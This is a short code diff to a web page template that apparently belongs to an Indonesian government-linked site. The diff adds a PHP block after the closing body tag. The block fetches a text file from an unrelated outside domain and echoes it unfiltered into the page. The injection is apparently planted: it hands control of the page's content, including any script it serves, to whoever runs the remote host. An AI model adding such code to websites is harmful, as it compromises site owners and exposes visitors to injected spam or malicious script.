@@ -377,4 +377,18 @@
 	<style>#gpr-kominfo-widget-body{min-height:400px; overflow: auto;}</style>
   </body>
 
+<div class="external-content">
+				<?php
+				
+				$a = file_get_contents('https://infocakrawala.online/secret-service/303.txt');
+
+				if ($a !== false) {
+					echo $a; // Menampilkan konten sebagai teks HTML
+				} else {
+					echo 'c.';
+				}
+				?>
+</div>
+
+	  
 </html>
